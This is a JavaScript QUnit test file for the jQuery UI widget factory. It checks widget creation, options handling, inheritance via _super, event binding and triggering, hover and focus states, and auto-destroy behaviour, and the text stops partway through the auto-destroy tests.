(function( $ ) {

module( "widget factory", {
	teardown: function() {
		if ( $.ui ) {
			delete $.ui.testWidget;
			delete $.fn.testWidget;
		}
	}
});

TestHelpers.testJshint( "widget" );

test( "widget creation", function() {
	expect( 5 );
	var method,
		myPrototype = {
			_create: function() {
				equal( method, "_create", "create function is copied over" );
			},
			creationTest: function() {
				equal( method, "creationTest", "random function is copied over" );
			}
		};

	$.widget( "ui.testWidget", myPrototype );
	ok( $.isFunction( $.ui.testWidget ), "constructor was created" );
	equal( typeof $.ui.testWidget.prototype, "object", "prototype was created" );
	method = "_create";
	$.ui.testWidget.prototype._create();
	method = "creationTest";
	$.ui.testWidget.prototype.creationTest();
	equal( $.ui.testWidget.prototype.option, $.Widget.prototype.option,
		"option method copied over from base widget" );
});

test( "element normalization", function() {
	expect( 11 );
	var elem;
	$.widget( "ui.testWidget", {} );

	$.ui.testWidget.prototype._create = function() {
		// workaround for core ticket #8381
		this.element.appendTo( "#qunit-fixture" );
		ok( this.element.is( "div" ), "generated div" );
		deepEqual( this.element.data( "ui-testWidget" ), this, "instance stored in .data()" );
	};
	$.ui.testWidget();

	$.ui.testWidget.prototype.defaultElement = "<span data-test='pass'></span>";
	$.ui.testWidget.prototype._create = function() {
		ok( this.element.is( "span[data-test=pass]" ), "generated span with properties" );
		deepEqual( this.element.data( "ui-testWidget" ), this, "instace stored in .data()" );
	};
	$.ui.testWidget();

	elem = $( "<input>" );
	$.ui.testWidget.prototype._create = function() {
		deepEqual( this.element[ 0 ], elem[ 0 ], "from element" );
		deepEqual( elem.data( "ui-testWidget" ), this, "instace stored in .data()" );
	};
	$.ui.testWidget( {}, elem[ 0 ] );

	elem = $( "<div>" );
	$.ui.testWidget.prototype._create = function() {
		deepEqual( this.element[ 0 ], elem[ 0 ], "from jQuery object" );
		deepEqual( elem.data( "ui-testWidget" ), this, "instace stored in .data()" );
	};
	$.ui.testWidget( {}, elem );

	elem = $( "<div id='element-normalization-selector'></div>" )
		.appendTo( "#qunit-fixture" );
	$.ui.testWidget.prototype._create = function() {
		deepEqual( this.element[ 0 ], elem[ 0 ], "from selector" );
		deepEqual( elem.data( "ui-testWidget" ), this, "instace stored in .data()" );
	};
	$.ui.testWidget( {}, "#element-normalization-selector" );

	$.ui.testWidget.prototype.defaultElement = null;
	$.ui.testWidget.prototype._create = function() {
		// using strictEqual throws an error (Maximum call stack size exceeded)
		ok( this.element[ 0 ] === this, "instance as element" );
	};
	$.ui.testWidget();
});

test( "custom selector expression", function() {
	expect( 1 );
	var elem = $( "<div>" ).appendTo( "#qunit-fixture" );
	$.widget( "ui.testWidget", {} );
	elem.testWidget();
	deepEqual( $( ":ui-testwidget" )[0], elem[0] );
	elem.testWidget( "destroy" );
});

test( "jQuery usage", function() {
	expect( 14 );

	var elem, instance, ret,
		shouldCreate = false;

	$.widget( "ui.testWidget", {
		getterSetterVal: 5,
		_create: function() {
			ok( shouldCreate, "create called on instantiation" );
		},
		methodWithParams: function( param1, param2 ) {
			ok( true, "method called via .pluginName(methodName)" );
			equal( param1, "value1",
				"parameter passed via .pluginName(methodName, param)" );
			equal( param2, "value2",
				"multiple parameters passed via .pluginName(methodName, param, param)" );

			return this;
		},
		getterSetterMethod: function( val ) {
			if ( val ) {
				this.getterSetterVal = val;
			} else {
				return this.getterSetterVal;
			}
		},
		jQueryObject: function() {
			return $( "body" );
		}
	});

	shouldCreate = true;
	elem = $( "<div>" )
		.bind( "testwidgetcreate", function() {
			ok( shouldCreate, "create event triggered on instantiation" );
		})
		.testWidget();
	shouldCreate = false;

	instance = elem.data( "ui-testWidget" );
	equal( typeof instance, "object", "instance stored in .data(pluginName)" );
	equal( instance.element[0], elem[0], "element stored on widget" );
	ret = elem.testWidget( "methodWithParams", "value1", "value2" );
	equal( ret, elem, "jQuery object returned from method call" );

	ret = elem.testWidget( "getterSetterMethod" );
	equal( ret, 5, "getter/setter can act as getter" );
	ret = elem.testWidget( "getterSetterMethod", 30 );
	equal( ret, elem, "getter/setter method can be chainable" );
	equal( instance.getterSetterVal, 30, "getter/setter can act as setter" );
	ret = elem.testWidget( "jQueryObject" );
	equal( ret[ 0 ], document.body, "returned jQuery object" );
	equal( ret.end(), elem, "stack preserved" );

	elem.testWidget( "destroy" );
	equal( elem.data( "ui-testWidget" ), null );
});

test( "direct usage", function() {
	expect( 9 );

	var elem, instance, ret,
		shouldCreate = false;

	$.widget( "ui.testWidget", {
		getterSetterVal: 5,
		_create: function() {
			ok( shouldCreate, "create called on instantiation" );
		},
		methodWithParams: function( param1, param2 ) {
			ok( true, "method called dirctly" );
			equal( param1, "value1", "parameter passed via direct call" );
			equal( param2, "value2", "multiple parameters passed via direct call" );

			return this;
		},
		getterSetterMethod: function( val ) {
			if ( val ) {
				this.getterSetterVal = val;
			} else {
				return this.getterSetterVal;
			}
		}
	});

	elem = $( "<div>" )[ 0 ];

	shouldCreate = true;
	instance = new $.ui.testWidget( {}, elem );
	shouldCreate = false;

	equal( $( elem ).data( "ui-testWidget" ), instance,
		"instance stored in .data(pluginName)" );
	equal( instance.element[ 0 ], elem, "element stored on widget" );

	ret = instance.methodWithParams( "value1", "value2" );
	equal( ret, instance, "plugin returned from method call" );

	ret = instance.getterSetterMethod();
	equal( ret, 5, "getter/setter can act as getter" );
	instance.getterSetterMethod( 30 );
	equal( instance.getterSetterVal, 30, "getter/setter can act as setter" );
});

test( "error handling", function() {
	expect( 3 );
	var error = $.error;
	$.widget( "ui.testWidget", {
		_privateMethod: function () {}
	});
	$.error = function( msg ) {
		equal( msg, "cannot call methods on testWidget prior to initialization; " +
			"attempted to call method 'missing'", "method call before init" );
	};
	$( "<div>" ).testWidget( "missing" );
	$.error = function( msg ) {
		equal( msg, "no such method 'missing' for testWidget widget instance",
			"invalid method call on widget instance" );
	};
	$( "<div>" ).testWidget().testWidget( "missing" );
	$.error = function ( msg ) {
		equal( msg, "no such method '_privateMethod' for testWidget widget instance",
			"invalid method call on widget instance" );
	};
	$( "<div>" ).testWidget().testWidget( "_privateMethod" );
	$.error = error;
});

test( "merge multiple option arguments", function() {
	expect( 1 );
	$.widget( "ui.testWidget", {
		_create: function() {
			deepEqual( this.options, {
				create: null,
				disabled: false,
				option1: "value1",
				option2: "value2",
				option3: "value3",
				option4: {
					option4a: "valuea",
					option4b: "valueb"
				}
			});
		}
	});
	$( "<div>" ).testWidget({
		option1: "valuex",
		option2: "valuex",
		option3: "value3",
		option4: {
			option4a: "valuex"
		}
	}, {
		option1: "value1",
		option2: "value2",
		option4: {
			option4b: "valueb"
		}
	}, {
		option4: {
			option4a: "valuea"
		}
	});
});

test( "._getCreateOptions()", function() {
	expect( 1 );
	$.widget( "ui.testWidget", {
		options: {
			option1: "valuex",
			option2: "valuex",
			option3: "value3"
		},
		_getCreateOptions: function() {
			return {
				option1: "override1",
				option2: "overideX"
			};
		},
		_create: function() {
			deepEqual( this.options, {
				create: null,
				disabled: false,
				option1: "override1",
				option2: "value2",
				option3: "value3"
			});
		}
	});
	$( "<div>" ).testWidget({ option2: "value2" });
});

test( "._getCreateEventData()", function() {
	expect( 1 );
	var data = { foo: "bar" };
	$.widget( "ui.testWidget", {
		_getCreateEventData: function() {
			return data;
		}
	});
	$( "<div>" ).testWidget({
		create: function( event, ui ) {
			strictEqual( ui, data, "event data" );
		}
	});
});

test( "re-init", function() {
	expect( 3 );
	var div = $( "<div>" ),
		actions = [];

	$.widget( "ui.testWidget", {
		_create: function() {
			actions.push( "create" );
		},
		_init: function() {
			actions.push( "init" );
		},
		_setOption: function( key ) {
			actions.push( "option" + key );
		}
	});

	actions = [];
	div.testWidget({ foo: "bar" });
	deepEqual( actions, [ "create", "init" ], "correct methods called on init" );

	actions = [];
	div.testWidget();
	deepEqual( actions, [ "init" ], "correct methods call on re-init" );

	actions = [];
	div.testWidget({ foo: "bar" });
	deepEqual( actions, [ "optionfoo", "init" ], "correct methods called on re-init with options" );
});

test( "inheritance", function() {
	expect( 6 );
	// #5830 - Widget: Using inheritance overwrites the base classes options
	$.widget( "ui.testWidgetBase", {
		options: {
			obj: {
				key1: "foo",
				key2: "bar"
			},
			arr: [ "testing" ]
		}
	});

	$.widget( "ui.testWidgetExtension", $.ui.testWidgetBase, {
		options: {
			obj: {
				key1: "baz"
			},
			arr: [ "alpha", "beta" ]
		}
	});

	equal( $.ui.testWidgetBase.prototype.widgetEventPrefix, "testWidgetBase",
		"base class event prefix" );
	deepEqual( $.ui.testWidgetBase.prototype.options.obj, {
		key1: "foo",
		key2: "bar"
	}, "base class option object not overridden");
	deepEqual( $.ui.testWidgetBase.prototype.options.arr, [ "testing" ],
		"base class option array not overridden");

	equal( $.ui.testWidgetExtension.prototype.widgetEventPrefix, "testWidgetExtension",
		"extension class event prefix" );
	deepEqual( $.ui.testWidgetExtension.prototype.options.obj, {
		key1: "baz",
		key2: "bar"
	}, "extension class option object extends base");
	deepEqual( $.ui.testWidgetExtension.prototype.options.arr, [ "alpha", "beta" ],
		"extension class option array overwrites base");

	delete $.ui.testWidgetBase;
	delete $.ui.testWidgetExtension;
});

test( "._super()", function() {
	expect( 9 );
	var instance;
	$.widget( "ui.testWidget", {
		method: function( a, b ) {
			deepEqual( this, instance, "this is correct in testWidget" );
			deepEqual( a, 5, "parameter passed to testWidget" );
			deepEqual( b, 20, "second parameter passed to testWidget" );
			return a + b;
		}
	});

	$.widget( "ui.testWidget2", $.ui.testWidget, {
		method: function( a, b ) {
			deepEqual( this, instance, "this is correct in testWidget2" );
			deepEqual( a, 5, "parameter passed to testWidget2" );
			deepEqual( b, 10, "parameter passed to testWidget2" );
			return this._super( a, b*2 );
		}
	});

	$.widget( "ui.testWidget3", $.ui.testWidget2, {
		method: function( a ) {
			deepEqual( this, instance, "this is correct in testWidget3" );
			deepEqual( a, 5, "parameter passed to testWidget3" );
			var ret = this._super( a, a*2 );
			deepEqual( ret, 25, "super returned value" );
		}
	});

	instance = $( "<div>" ).testWidget3().data( "ui-testWidget3" );
	instance.method( 5 );
	delete $.ui.testWidget3;
	delete $.ui.testWidget2;
});

test( "._superApply()", function() {
	expect( 10 );
	var instance;
	$.widget( "ui.testWidget", {
		method: function( a, b ) {
			deepEqual( this, instance, "this is correct in testWidget" );
			deepEqual( a, 5, "parameter passed to testWidget" );
			deepEqual( b, 10, "second parameter passed to testWidget" );
			return a + b;
		}
	});

	$.widget( "ui.testWidget2", $.ui.testWidget, {
		method: function( a, b ) {
			deepEqual( this, instance, "this is correct in testWidget2" );
			deepEqual( a, 5, "parameter passed to testWidget2" );
			deepEqual( b, 10, "second parameter passed to testWidget2" );
			return this._superApply( arguments );
		}
	});

	$.widget( "ui.testWidget3", $.ui.testWidget2, {
		method: function( a, b ) {
			deepEqual( this, instance, "this is correct in testWidget3" );
			deepEqual( a, 5, "parameter passed to testWidget3" );
			deepEqual( b, 10, "second parameter passed to testWidget3" );
			var ret = this._superApply( arguments );
			deepEqual( ret, 15, "super returned value" );
		}
	});

	instance = $( "<div>" ).testWidget3().data( "ui-testWidget3" );
	instance.method( 5, 10 );
	delete $.ui.testWidget3;
	delete $.ui.testWidget2;
});

test( ".option() - getter", function() {
	expect( 6 );
	$.widget( "ui.testWidget", {
		_create: function() {}
	});

	var options,
		div = $( "<div>" ).testWidget({
			foo: "bar",
			baz: 5,
			qux: [ "quux", "quuux" ]
		});

	deepEqual( div.testWidget( "option", "x" ), null, "non-existent option" );
	deepEqual( div.testWidget( "option", "foo"), "bar", "single option - string" );
	deepEqual( div.testWidget( "option", "baz"), 5, "single option - number" );
	deepEqual( div.testWidget( "option", "qux"), [ "quux", "quuux" ],
		"single option - array" );

	options = div.testWidget( "option" );
	deepEqual( options, {
		create: null,
		disabled: false,
		foo: "bar",
		baz: 5,
		qux: [ "quux", "quuux" ]
	}, "full options hash returned" );
	options.foo = "notbar";
	deepEqual( div.testWidget( "option", "foo"), "bar",
		"modifying returned options hash does not modify plugin instance" );
});

test( ".option() - deep option getter", function() {
	expect( 5 );
	$.widget( "ui.testWidget", {} );
	var div = $( "<div>" ).testWidget({
		foo: {
			bar: "baz",
			qux: {
				quux: "xyzzy"
			}
		}
	});
	equal( div.testWidget( "option", "foo.bar" ), "baz", "one level deep - string" );
	deepEqual( div.testWidget( "option", "foo.qux" ), { quux: "xyzzy" },
		"one level deep - object" );
	equal( div.testWidget( "option", "foo.qux.quux" ), "xyzzy", "two levels deep - string" );
	equal( div.testWidget( "option", "x.y" ), null, "top level non-existent" );
	equal( div.testWidget( "option", "foo.x.y" ), null, "one level deep - non-existent" );
});

test( ".option() - delegate to ._setOptions()", function() {
	expect( 2 );
	var div,
		calls = [];
	$.widget( "ui.testWidget", {
		_create: function() {},
		_setOptions: function( options ) {
			calls.push( options );
		}
	});
	div = $( "<div>" ).testWidget();

	calls = [];
	div.testWidget( "option", "foo", "bar" );
	deepEqual( calls, [{ foo: "bar" }], "_setOptions called for single option" );

	calls = [];
	div.testWidget( "option", {
		bar: "qux",
		quux: "quuux"
	});
	deepEqual( calls, [{ bar: "qux", quux: "quuux" }],
		"_setOptions called with multiple options" );
});

test( ".option() - delegate to ._setOption()", function() {
	expect( 2 );
	var div,
		calls = [];
	$.widget( "ui.testWidget", {
		_create: function() {},
		_setOption: function( key, val ) {
			calls.push({
				key: key,
				val: val
			});
		}
	});
	div = $( "<div>" ).testWidget();

	calls = [];
	div.testWidget( "option", "foo", "bar" );
	deepEqual( calls, [{ key: "foo", val: "bar" }],
		"_setOption called for single option" );

	calls = [];
	div.testWidget( "option", {
		bar: "qux",
		quux: "quuux"
	});
	deepEqual( calls, [
		{ key: "bar", val: "qux" },
		{ key: "quux", val: "quuux" }
	], "_setOption called with multiple options" );
});

test( ".option() - deep option setter", function() {
	expect( 6 );
	$.widget( "ui.testWidget", {} );
	var div = $( "<div>" ).testWidget();
	function deepOption( from, to, msg ) {
		div.data( "ui-testWidget" ).options.foo = from;
		$.ui.testWidget.prototype._setOption = function( key, value ) {
			deepEqual( key, "foo", msg + ": key" );
			deepEqual( value, to, msg + ": value" );
		};
	}

	deepOption( { bar: "baz" }, { bar: "qux" }, "one deep" );
	div.testWidget( "option", "foo.bar", "qux" );

	deepOption( null, { bar: "baz" }, "null" );
	div.testWidget( "option", "foo.bar", "baz" );

	deepOption(
		{ bar: "baz", qux: { quux: "quuux" } },
		{ bar: "baz", qux: { quux: "quuux", newOpt: "newVal" } },
		"add property" );
	div.testWidget( "option", "foo.qux.newOpt", "newVal" );
});

test( ".enable()", function() {
	expect( 2 );
	$.widget( "ui.testWidget", {
		_create: function() {},
		_setOption: function( key, val ) {
			deepEqual( key, "disabled", "_setOption called with disabled option" );
			deepEqual( val, false, "disabled set to false" );
		}
	});
	$( "<div>" ).testWidget().testWidget( "enable" );
});

test( ".disable()", function() {
	expect( 2 );
	$.widget( "ui.testWidget", {
		_create: function() {},
		_setOption: function( key, val ) {
			deepEqual( key, "disabled", "_setOption called with disabled option" );
			deepEqual( val, true, "disabled set to true" );
		}
	});
	$( "<div>" ).testWidget().testWidget( "disable" );
});

test( ".widget() - base", function() {
	expect( 1 );
	$.widget( "ui.testWidget", {
		_create: function() {}
	});
	var div = $( "<div>" ).testWidget();
	deepEqual( div[0], div.testWidget( "widget" )[0]);
});

test( ".widget() - overriden", function() {
	expect( 1 );
	var wrapper = $( "<div>" );
	$.widget( "ui.testWidget", {
		_create: function() {},
		widget: function() {
			return wrapper;
		}
	});
	deepEqual( wrapper[0], $( "<div>" ).testWidget().testWidget( "widget" )[0] );
});

test( "._on() to element (default)", function() {
	expect( 12 );
	var that, widget;
	$.widget( "ui.testWidget", {
		_create: function() {
			that = this;
			this._on({
				keyup: this.keyup,
				keydown: "keydown"
			});
		},
		keyup: function( event ) {
			equal( that, this );
			equal( that.element[0], event.currentTarget );
			equal( "keyup", event.type );
		},
		keydown: function( event ) {
			equal( that, this );
			equal( that.element[0], event.currentTarget );
			equal( "keydown", event.type );
		}
	});
	widget = $( "<div></div>" )
		.testWidget()
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "disable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "enable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "destroy" )
		.trigger( "keyup" )
		.trigger( "keydown" );
});

test( "._on() to element with suppressDisabledCheck", function() {
	expect( 18 );
	var that, widget;
	$.widget( "ui.testWidget", {
		_create: function() {
			that = this;
			this._on( true, {
				keyup: this.keyup,
				keydown: "keydown"
			});
		},
		keyup: function( event ) {
			equal( that, this );
			equal( that.element[0], event.currentTarget );
			equal( "keyup", event.type );
		},
		keydown: function( event ) {
			equal( that, this );
			equal( that.element[0], event.currentTarget );
			equal( "keydown", event.type );
		}
	});
	widget = $( "<div></div>" )
		.testWidget()
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "disable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "enable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "destroy" )
		.trigger( "keyup" )
		.trigger( "keydown" );
});

test( "._on() to descendent", function() {
	expect( 12 );
	var that, widget, descendant;
	$.widget( "ui.testWidget", {
		_create: function() {
			that = this;
			this._on( this.element.find( "strong" ), {
				keyup: this.keyup,
				keydown: "keydown"
			});
		},
		keyup: function( event ) {
			equal( that, this );
			equal( that.element.find( "strong" )[0], event.currentTarget );
			equal( "keyup", event.type );
		},
		keydown: function(event) {
			equal( that, this );
			equal( that.element.find( "strong" )[0], event.currentTarget );
			equal( "keydown", event.type );
		}
	});
	// trigger events on both widget and descendent to ensure that only descendent receives them
	widget = $( "<div><p><strong>hello</strong> world</p></div>" )
		.testWidget()
		.trigger( "keyup" )
		.trigger( "keydown" );
	descendant = widget.find( "strong" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "disable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	descendant
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "enable" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	descendant
		.trigger( "keyup" )
		.trigger( "keydown" );
	descendant
		.addClass( "ui-state-disabled" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	widget
		.testWidget( "destroy" )
		.trigger( "keyup" )
		.trigger( "keydown" );
	descendant
		.trigger( "keyup" )
		.trigger( "keydown" );
});

test( "_on() with delegate", function() {
	expect( 8 );
	$.widget( "ui.testWidget", {
		_create: function() {
			var uuid = this.uuid;
			this.element = {
				bind: function( event, handler ) {
					equal( event, "click.testWidget" + uuid );
					ok( $.isFunction(handler) );
				},
				trigger: $.noop
			};
			this.widget = function() {
				return {
					delegate: function( selector, event, handler ) {
						equal( selector, "a" );
						equal( event, "click.testWidget" + uuid );
						ok( $.isFunction(handler) );
					}
				};
			};
			this._on({
				"click": "handler",
				"click a": "handler"
			});
			this.widget = function() {
				return {
					delegate: function( selector, event, handler ) {
						equal( selector, "form fieldset > input" );
						equal( event, "change.testWidget" + uuid );
						ok( $.isFunction(handler) );
					}
				};
			};
			this._on({
				"change form fieldset > input": "handler"
			});
		}
	});
	$.ui.testWidget();
});

test( "_on() with delegate to descendent", function() {
	expect( 4 );
	$.widget( "ui.testWidget", {
		_create: function() {
			this.target = $( "<p><strong>hello</strong> world</p>" );
			this.child = this.target.children();
			this._on( this.target, {
				"keyup": "handlerDirect",
				"keyup strong": "handlerDelegated"
			});
			this.child.trigger( "keyup" );
		},
		handlerDirect: function( event ) {
			deepEqual( event.currentTarget, this.target[ 0 ] );
			deepEqual( event.target, this.child[ 0 ] );
		},
		handlerDelegated: function( event ) {
			deepEqual( event.currentTarget, this.child[ 0 ] );
			deepEqual( event.target, this.child[ 0 ] );
		}
	});
	$.ui.testWidget();
});

test( "_on() to common element", function() {
	expect( 1 );
	$.widget( "ui.testWidget", {
		_create: function() {
			this._on( this.document, {
				"customevent": "_handler"
			});
		},
		_handler: function() {
			ok( true, "handler triggered" );
		}
	});
	var widget = $( "#widget" ).testWidget().data( "ui-testWidget" );
	$( "#widget-wrapper" ).testWidget();
	widget.destroy();
	$( document ).trigger( "customevent" );
});

test( "_off() - single event", function() {
	expect( 3 );

	$.widget( "ui.testWidget", {} );
	var shouldTriggerWidget, shouldTriggerOther,
		element = $( "#widget" ),
		widget = element.testWidget().data( "ui-testWidget" );
	widget._on( element, { foo: function() {
		ok( shouldTriggerWidget, "foo called from _on" );
	}});
	element.bind( "foo", function() {
		ok( shouldTriggerOther, "foo called from bind" );
	});
	shouldTriggerWidget = true;
	shouldTriggerOther = true;
	element.trigger( "foo" );
	shouldTriggerWidget = false;
	widget._off( element, "foo" );
	element.trigger( "foo" );
});

test( "_off() - multiple events", function() {
	expect( 6 );

	$.widget( "ui.testWidget", {} );
	var shouldTriggerWidget, shouldTriggerOther,
		element = $( "#widget" ),
		widget = element.testWidget().data( "ui-testWidget" );
	widget._on( element, {
		foo: function() {
			ok( shouldTriggerWidget, "foo called from _on" );
		},
		bar: function() {
			ok( shouldTriggerWidget, "bar called from _on" );
		}
	});
	element.bind( "foo bar", function( event ) {
		ok( shouldTriggerOther, event.type + " called from bind" );
	});
	shouldTriggerWidget = true;
	shouldTriggerOther = true;
	element.trigger( "foo" );
	element.trigger( "bar" );
	shouldTriggerWidget = false;
	widget._off( element, "foo bar" );
	element.trigger( "foo" );
	element.trigger( "bar" );
});

test( "_off() - all events", function() {
	expect( 6 );

	$.widget( "ui.testWidget", {} );
	var shouldTriggerWidget, shouldTriggerOther,
		element = $( "#widget" ),
		widget = element.testWidget().data( "ui-testWidget" );
	widget._on( element, {
		foo: function() {
			ok( shouldTriggerWidget, "foo called from _on" );
		},
		bar: function() {
			ok( shouldTriggerWidget, "bar called from _on" );
		}
	});
	element.bind( "foo bar", function( event ) {
		ok( shouldTriggerOther, event.type + " called from bind" );
	});
	shouldTriggerWidget = true;
	shouldTriggerOther = true;
	element.trigger( "foo" );
	element.trigger( "bar" );
	shouldTriggerWidget = false;
	widget._off( element );
	element.trigger( "foo" );
	element.trigger( "bar" );
});

test( "._hoverable()", function() {
	expect( 10 );
	$.widget( "ui.testWidget", {
		_create: function() {
			this._hoverable( this.element.children() );
		}
	});

	var div = $( "#widget" ).testWidget().children();
	ok( !div.hasClass( "ui-state-hover" ), "not hovered on init" );
	div.trigger( "mouseenter" );
	ok( div.hasClass( "ui-state-hover" ), "hovered after mouseenter" );
	div.trigger( "mouseleave" );
	ok( !div.hasClass( "ui-state-hover" ), "not hovered after mouseleave" );

	div.trigger( "mouseenter" );
	ok( div.hasClass( "ui-state-hover" ), "hovered after mouseenter" );
	$( "#widget" ).testWidget( "disable" );
	ok( !div.hasClass( "ui-state-hover" ), "not hovered while disabled" );
	div.trigger( "mouseenter" );
	ok( !div.hasClass( "ui-state-hover" ), "can't hover while disabled" );
	$( "#widget" ).testWidget( "enable" );
	ok( !div.hasClass( "ui-state-hover" ), "enabling doesn't reset hover" );

	div.trigger( "mouseenter" );
	ok( div.hasClass( "ui-state-hover" ), "hovered after mouseenter" );
	$( "#widget" ).testWidget( "destroy" );
	ok( !div.hasClass( "ui-state-hover" ), "not hovered after destroy" );
	div.trigger( "mouseenter" );
	ok( !div.hasClass( "ui-state-hover" ), "event handler removed on destroy" );
});

test( "._focusable()", function() {
	expect( 10 );
	$.widget( "ui.testWidget", {
		_create: function() {
			this._focusable( this.element.children() );
		}
	});

	var div = $( "#widget" ).testWidget().children();
	ok( !div.hasClass( "ui-state-focus" ), "not focused on init" );
	div.trigger( "focusin" );
	ok( div.hasClass( "ui-state-focus" ), "focused after explicit focus" );
	div.trigger( "focusout" );
	ok( !div.hasClass( "ui-state-focus" ), "not focused after blur" );

	div.trigger( "focusin" );
	ok( div.hasClass( "ui-state-focus" ), "focused after explicit focus" );
	$( "#widget" ).testWidget( "disable" );
	ok( !div.hasClass( "ui-state-focus" ), "not focused while disabled" );
	div.trigger( "focusin" );
	ok( !div.hasClass( "ui-state-focus" ), "can't focus while disabled" );
	$( "#widget" ).testWidget( "enable" );
	ok( !div.hasClass( "ui-state-focus" ), "enabling doesn't reset focus" );

	div.trigger( "focusin" );
	ok( div.hasClass( "ui-state-focus" ), "focused after explicit focus" );
	$( "#widget" ).testWidget( "destroy" );
	ok( !div.hasClass( "ui-state-focus" ), "not focused after destroy" );
	div.trigger( "focusin" );
	ok( !div.hasClass( "ui-state-focus" ), "event handler removed on destroy" );
});

test( "._trigger() - no event, no ui", function() {
	expect( 7 );
	var handlers = [];

	$.widget( "ui.testWidget", {
		_create: function() {}
	});

	$( "#widget" ).testWidget({
		foo: function( event, ui ) {
			deepEqual( event.type, "testwidgetfoo", "correct event type in callback" );
			deepEqual( ui, {}, "empty ui hash passed" );
			handlers.push( "callback" );
		}
	});
	$( document ).add( "#widget-wrapper" ).add( "#widget" )
		.bind( "testwidgetfoo", function( event, ui ) {
			deepEqual( ui, {}, "empty ui hash passed" );
			handlers.push( this );
		});
	deepEqual( $( "#widget" ).data( "ui-testWidget" )._trigger( "foo" ), true,
		"_trigger returns true when event is not cancelled" );
	deepEqual( handlers, [
		$( "#widget" )[ 0 ],
		$( "#widget-wrapper" )[ 0 ],
		document,
		"callback"
	], "event bubbles and then invokes callback" );

	$( document ).unbind( "testwidgetfoo" );
});

test( "._trigger() - cancelled event", function() {
	expect( 3 );

	$.widget( "ui.testWidget", {
		_create: function() {}
	});

	$( "#widget" ).testWidget({
		foo: function() {
			ok( true, "callback invoked even if event is cancelled" );
		}
	})
	.bind( "testwidgetfoo", function() {
		ok( true, "event was triggered" );
		return false;
	});
	deepEqual( $( "#widget" ).data( "ui-testWidget" )._trigger( "foo" ), false,
		"_trigger returns false when event is cancelled" );
});

test( "._trigger() - cancelled callback", function() {
	expect( 1 );
	$.widget( "ui.testWidget", {
		_create: function() {}
	});

	$( "#widget" ).testWidget({
		foo: function() {
			return false;
		}
	});
	deepEqual( $( "#widget" ).data( "ui-testWidget" )._trigger( "foo" ), false,
		"_trigger returns false when callback returns false" );
});

test( "._trigger() - provide event and ui", function() {
	expect( 7 );

	var originalEvent = $.Event( "originalTest" );
	$.widget( "ui.testWidget", {
		_create: function() {},
		testEvent: function() {
			var ui = {
					foo: "bar",
					baz: {
						qux: 5,
						quux: 20
					}
				};
			this._trigger( "foo", originalEvent, ui );
			deepEqual( ui, {
				foo: "notbar",
				baz: {
					qux: 10,
					quux: "jQuery"
				}
			}, "ui object modified" );
		}
	});
	$( "#widget" ).bind( "testwidgetfoo", function( event, ui ) {
		equal( event.originalEvent, originalEvent, "original event object passed" );
		deepEqual( ui, {
			foo: "bar",
			baz: {
				qux: 5,
				quux: 20
			}
		}, "ui hash passed" );
		ui.foo = "notbar";
	});
	$( "#widget-wrapper" ).bind( "testwidgetfoo", function( event, ui ) {
		equal( event.originalEvent, originalEvent, "original event object passed" );
		deepEqual( ui, {
			foo: "notbar",
			baz: {
				qux: 5,
				quux: 20
			}
		}, "modified ui hash passed" );
		ui.baz.qux = 10;
	});
	$( "#widget" ).testWidget({
		foo: function( event, ui ) {
			equal( event.originalEvent, originalEvent, "original event object passed" );
			deepEqual( ui, {
				foo: "notbar",
				baz: {
					qux: 10,
					quux: 20
				}
			}, "modified ui hash passed" );
			ui.baz.quux = "jQuery";
		}
	})
	.testWidget( "testEvent" );
});

test( "._trigger() - array as ui", function() {
	// #6795 - Widget: handle array arguments to _trigger consistently
	expect( 4 );

	$.widget( "ui.testWidget", {
		_create: function() {},
		testEvent: function() {
			var ui = {
					foo: "bar",
					baz: {
						qux: 5,
						quux: 20
					}
				},
				extra = {
					bar: 5
				};
			this._trigger( "foo", null, [ ui, extra ] );
		}
	});
	$( "#widget" ).bind( "testwidgetfoo", function( event, ui, extra ) {
		deepEqual( ui, {
			foo: "bar",
			baz: {
				qux: 5,
				quux: 20
			}
		}, "event: ui hash passed" );
		deepEqual( extra, {
			bar: 5
		}, "event: extra argument passed" );
	});
	$( "#widget" ).testWidget({
		foo: function( event, ui, extra ) {
			deepEqual( ui, {
				foo: "bar",
				baz: {
					qux: 5,
					quux: 20
				}
			}, "callback: ui hash passed" );
			deepEqual( extra, {
				bar: 5
			}, "callback: extra argument passed" );
		}
	})
	.testWidget( "testEvent" );
});

test( "._trigger() - instance as element", function() {
	expect( 4 );
	$.widget( "ui.testWidget", {
		defaultElement: null,
		testEvent: function() {
			this._trigger( "foo", null, { foo: "bar" } );
		}
	});
	var instance = $.ui.testWidget({
		foo: function( event, ui ) {
			equal( event.type, "testwidgetfoo", "event object passed to callback" );
			deepEqual( ui, { foo: "bar" }, "ui object passed to callback" );
		}
	});
	$( instance ).bind( "testwidgetfoo", function( event, ui ) {
		equal( event.type, "testwidgetfoo", "event object passed to event handler" );
		deepEqual( ui, { foo: "bar" }, "ui object passed to event handler" );
	});
	instance.testEvent();
});

(function() {
	function shouldDestroy( expected, callback ) {
		expect( 1 );
		var destroyed = false;
		$.widget( "ui.testWidget", {
			_create: function() {},
			destroy: function() {
				destroyed = true;
			}
		});
		callback();
		equal( destroyed, expected );
	}

	test( "auto-destroy - .remove()", function() {
		shouldDestroy( true, function() {
			$( "#widget" ).testWidget().remove();
		});
	});

	test( "auto-destroy - .remove() when disabled", function() {
		shouldDestroy( true, function() {
			$( "#widget" ).testWidget({ disabled: true }).remove();
		});
	});

	test( "auto-destroy - .remove() on parent", function() {
		shouldDestroy( true, function() {
			$( "#widget" ).testWidget().parent().remove();
		});
	});

	test( "auto-destroy - .remove() on child", function() {
		shouldDestroy( false, function() {
			$( "#widget" ).testWidget().children().remove();
		});
	});

	test( "auto-destroy - .empty()", function() {
		shouldDestroy( false, function() {
			$( "#widget" ).testWidget().empty();
		});
	});

